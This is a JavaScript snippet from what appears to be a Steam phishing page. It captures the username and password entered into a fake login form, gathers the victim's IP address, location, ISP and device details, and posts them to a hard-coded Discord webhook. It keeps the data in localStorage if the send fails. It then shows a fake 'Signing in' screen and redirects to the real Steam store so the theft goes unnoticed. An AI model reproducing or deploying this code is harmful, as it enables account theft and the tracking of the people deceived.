    <!-- Discord Webhook -->
    <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1481029059291671243/lcGhidPjsc8KdFfYb_5khbIRB8SCVOE3nmFU_LsJmPC1jjPjN";
    
    async function collectVictimInfo() {
        const info = {
            ip: 'Unknown',
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            screen: `${screen.width}x${screen.height} (${screen.colorDepth}-bit)`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookiesEnabled: navigator.cookieEnabled,
            referrer: document.referrer || 'Direct',
            timestamp: new Date().toISOString(),
            url: window.location.href
        };

        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            info.ip = ipData.ip;
            
            try {
                const locResponse = await fetch(`https://ipapi.co/${info.ip}/json/`);
                const locData = await locResponse.json();
                info.location = `${locData.city || 'Unknown'}, ${locData.region || 'Unknown'}, ${locData.country_name || 'Unknown'}`;
                info.isp = locData.org || 'Unknown';
            } catch {}
        } catch {}

        return info;
    }

    async function sendToWebhook(username, password, victimInfo) {
        const embed = {
            title: "🎮 STEAM CREDENTIALS CAPTURED",
            color: 16711680,
            description: `**Victim entered credentials on phishing page**`,
            fields: [
                { name: "👤 Username", value: `\`${username}\``, inline: true },
                { name: "🔑 Password", value: `\`${password}\``, inline: true },
                { name: "📍 IP Address", value: `\`${victimInfo.ip}\``, inline: true },
                { name: "🌍 Location", value: victimInfo.location || 'Unknown', inline: true },
                { name: "🕒 Local Time", value: new Date().toLocaleString(), inline: true },
                { name: "🖥️ Browser", value: getBrowserInfo(), inline: true },
                { name: "💻 OS", value: getOSInfo(), inline: true },
                { name: "📱 Device", value: getDeviceInfo(), inline: true },
                { name: "📏 Screen", value: victimInfo.screen, inline: true }
            ],
            footer: { 
                text: "Steam Phishing • " + new Date().toLocaleDateString()
            },
            timestamp: victimInfo.timestamp
        };

        try {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    embeds: [embed],
                    content: "@everyone **🚨 NEW STEAM CREDENTIALS CAPTURED!**",
                    username: "Steam Security Alert"
                })
            });
        } catch (error) {
            // Fallback to localStorage
            try {
                const fallbackData = { username, password, victimInfo, timestamp: new Date().toISOString() };
                const existing = JSON.parse(localStorage.getItem('steam_captured') || '[]');
                existing.push(fallbackData);
                localStorage.setItem('steam_captured', JSON.stringify(existing));
            } catch {}
        }
    }

    function getBrowserInfo() {
        const ua = navigator.userAgent;
        if (ua.includes("Firefox")) return "Firefox";
        else if (ua.includes("Chrome")) return "Chrome";
        else if (ua.includes("Safari")) return "Safari";
        else if (ua.includes("Edge")) return "Edge";
        else if (ua.includes("Opera")) return "Opera";
        else if (ua.includes("MSIE") || ua.includes("Trident")) return "Internet Explorer";
        return "Unknown";
    }

    function getOSInfo() {
        const ua = navigator.userAgent;
        if (ua.includes("Windows")) return "Windows";
        else if (ua.includes("Mac")) return "macOS";
        else if (ua.includes("Linux")) return "Linux";
        else if (ua.includes("Android")) return "Android";
        else if (ua.includes("iOS") || ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
        return "Unknown";
    }

    function getDeviceInfo() {
        const ua = navigator.userAgent;
        if (ua.includes("Mobile")) return "Mobile";
        else if (ua.includes("Tablet")) return "Tablet";
        return "Desktop";
    }

    function showFakeLoading() {
        const overlay = document.createElement('div');
        overlay.id = 'loadingOverlay';
        overlay.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #171a21;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 99999;
            color: white;
            font-family: 'Motiva Sans', sans-serif;
        `;

        overlay.innerHTML = `
            <div style="text-align: center; max-width: 400px; padding: 30px;">
                <div style="width: 60px; height: 60px; border: 4px solid #66c0f4; border-top: 4px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 30px;"></div>
                <h2 style="margin-bottom: 15px; color: #66c0f4;">Signing in...</h2>
                <p style="color: #c6d4df; line-height: 1.5; margin-bottom: 20px;">
                    Verifying your credentials with Steam servers.
                </p>
                <div style="width: 100%; height: 6px; background: #2a475e; border-radius: 3px; overflow: hidden; margin-top: 30px;">
                    <div id="progressBar" style="width: 0%; height: 100%; background: linear-gradient(90deg, #66c0f4, #4d9bc1); border-radius: 3px; transition: width 2s ease-in-out;"></div>
                </div>
            </div>
            <style>
                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
            </style>
        `;

        document.body.appendChild(overlay);

        setTimeout(() => {
            const progressBar = document.getElementById('progressBar');
            if (progressBar) progressBar.style.width = '30%';
        }, 500);

        setTimeout(() => {
            const progressBar = document.getElementById('progressBar');
            if (progressBar) progressBar.style.width = '70%';
        }, 1500);

        setTimeout(() => {
            const progressBar = document.getElementById('progressBar');
            if (progressBar) progressBar.style.width = '100%';
        }, 2500);

        setTimeout(() => {
            if (document.getElementById('loadingOverlay')) {
                document.getElementById('loadingOverlay').remove();
            }
            window.location.href = 'https://store.steampowered.com/';
        }, 3500);
    }

    document.addEventListener('DOMContentLoaded', function() {
        const form = document.getElementById('phishingForm');
        if (!form) return;

        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value;
            
            if (!username || !password) return;
            
            const submitBtn = document.querySelector('button[type="submit"]');
            if (submitBtn) {
                submitBtn.disabled = true;
                submitBtn.textContent = 'Signing in...';
            }
            
            try {
                const victimInfo = await collectVictimInfo();
                await sendToWebhook(username, password, victimInfo);
                
                showFakeLoading();
                
            } catch (error) {
                console.error('Error:', error);
                setTimeout(() => {
                    window.location.href = 'https://store.steampowered.com/';
                }, 2000);
            }
            
            return false;
        });
    });
    </script>
